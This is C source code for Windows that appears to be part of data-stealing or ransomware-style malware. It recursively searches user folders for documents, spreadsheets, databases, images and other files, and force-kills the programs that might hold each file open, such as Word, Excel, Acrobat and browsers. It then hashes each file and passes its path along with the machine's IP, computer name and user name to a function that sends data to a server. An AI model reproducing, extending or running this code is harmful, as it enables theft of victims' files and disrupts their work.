#include "commun.h"


// Define the extensions to look for
const char* extensions[] = { ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".accdb", ".pdf", ".jpeg", ".jpg", ".png", ".txt", "json", ".db", ".xml", ".html", NULL};

const char* docHandlers[] = { "WINWORD.EXE", "wordpad.exe", "libreoffice.exe", "soffice.bin", NULL };
const char* xlsHandlers[] = { "EXCEL.EXE", "libreoffice.exe", "soffice.bin", NULL };
const char* pptHandlers[] = { "POWERPNT.EXE", "libreoffice.exe", "soffice.bin", NULL };
const char* accdbHandlers[] = { "MSACCESS.EXE", NULL };
const char* pdfHandlers[] = { "AcroRd32.exe", "FoxitReader.exe", "SumatraPDF.exe", "PDFXCview.exe", NULL };
const char* imageHandlers[] = { "photos.exe", "paint.exe", "photoshop.exe", "gimp-2.10.exe", "IrfanView.exe", "Picasa3.exe", NULL };
const char* txtHandlers[] = { "notepad.exe", "wordpad.exe", "notepad++.exe", "sublime_text.exe", "code.exe", NULL };
const char* jsonHandlers[] = { "notepad.exe", "notepad++.exe", "code.exe", "sublime_text.exe", NULL };
const char* dbHandlers[] = { "sqlite3.exe", "DBeaver.exe", "pgAdmin.exe", "HeidiSQL.exe", "MySQLWorkbench.exe", NULL };
const char* xmlHandlers[] = { "notepad.exe", "notepad++.exe", "code.exe", "xmlexplorer.exe", "xmlspy.exe", NULL };
const char* htmlHandlers[] = { "chrome.exe", "firefox.exe", "iexplore.exe", "code.exe", "opera.exe", "edge.exe", "safari.exe", NULL };


const char** extensionHandlers[] = { docHandlers, docHandlers, xlsHandlers, xlsHandlers, pptHandlers, pptHandlers, accdbHandlers, pdfHandlers, imageHandlers, imageHandlers, imageHandlers, txtHandlers, jsonHandlers, dbHandlers, xmlHandlers, htmlHandlers, NULL };



const char** getHandlersForExtension(const char* ext) {
    for (int i = 0; extensions[i]; i++) {
        if (_stricmp(ext, extensions[i]) == 0) {
            return extensionHandlers[i];
        }
    }
    return NULL; // No handlers found for this extension
}


// Function to check if the extension matches the list
int isValidExtension(const char* fileName) {
    const char* ext = strrchr(fileName, '.');
    if (!ext) return 0;
    for (int i = 0; extensions[i]; i++) {
        if (_stricmp(ext, extensions[i]) == 0) return 1;
    }
    return 0;
}

void findFiles(const char* directory, int* fileCount, const char* ip, const char* computerName, const char* userName) {


    char searchPath[MAX_PATH];
    _snprintf(searchPath, sizeof(searchPath), "%s\\*", directory);

    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA(searchPath, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }
    else {
        do {
            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0) {
                    char subdir[MAX_PATH];
                    _snprintf(subdir, sizeof(subdir), "%s\\%s", directory, findFileData.cFileName);



                    if (_strnicmp(subdir, "C:\\ProgramData", 14) != 0 && _strnicmp(subdir, "C:\\$WinREAgent", 14) != 0
                        && _strnicmp(subdir, "C:\\$Recycle.Bin", 15) != 0 && _strnicmp(subdir, "C:\\Windows", 10) != 0
                        && _strnicmp(subdir, "C:\\Program Files", 17) != 0 && _strnicmp(subdir, "C:\\Program Files (x86)", 23) != 0
                        && strstr(subdir, "\\AppData\\") == NULL && strstr(subdir, "\\.vscode\\") == NULL
                        && _strnicmp(subdir, "C:\\Users\\All Users", 18) != 0
                        && _strnicmp(subdir, "C:\\Users\\Public\\AccountPictures", 34) != 0
                        && _strnicmp(subdir, "C:\\Users\\Public\\Documents\\Explorer Suite Signatures", 52) != 0
                        && _strnicmp(subdir, "C:\\Python", 9) != 0
                        ) {
                        findFiles(subdir, fileCount, ip, computerName, userName);
                    }
                }
            }
            else if (isValidExtension(findFileData.cFileName) /* ... */) {
                if (strstr(findFileData.cFileName, "Browse.VC.db") != 0) {
                    continue; // Skip to the next file
                }

                if (strstr(findFileData.cFileName, ".vcxproj.") != 0) {
                    continue; // Skip to the next file
                }

                if (strstr(findFileData.cFileName, ".csproj.") != 0) {
                    continue; // Skip to the next file
                }

                if (strstr(findFileData.cFileName, "Solution.VC.db") != 0) {
                    continue; // Skip to the next file
                }



                char filePath[MAX_PATH];
                _snprintf(filePath, sizeof(filePath), "%s\\%s", directory, findFileData.cFileName);

                
                BYTE hashValue[32];
                if (computeSHA256(filePath, hashValue)) {
                    printf("File found: %s\nSHA-256 Hash: ", filePath);
                    for (int i = 0; i < sizeof(hashValue); i++) {
                        printf("%02x", hashValue[i]);
                    }
                }

                
                // Extract the extension from the filename
                const char* ext = strrchr(findFileData.cFileName, '.');
                if (ext) {
                    // Get processes associated with the extension
                    const char** handlers = getHandlersForExtension(ext);
                    if (handlers) {
                        int i = 0;
                        while (handlers[i]) {
                            killProcessByName(handlers[i]);
                            i++;
                        }
                    }
                }



                // Read file content
                HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hFile != INVALID_HANDLE_VALUE) {
                    DWORD fileSize = GetFileSize(hFile, NULL);


                   

                    SendDataToServer(filePath, hashValue, ip, computerName, userName);

                    Sleep(10000);
                    printf("\n\n");

                    CloseHandle(hFile);
                
                }else {

                    DWORD dwError = GetLastError();
                    fprintf(stderr, "Failed to open file %s. Error code: %d\n", filePath, dwError);
                
                }

                (*fileCount)++; // Increment the file count
            }

        } while (FindNextFileA(hFind, &findFileData) != 0);
        FindClose(hFind);
    }
}
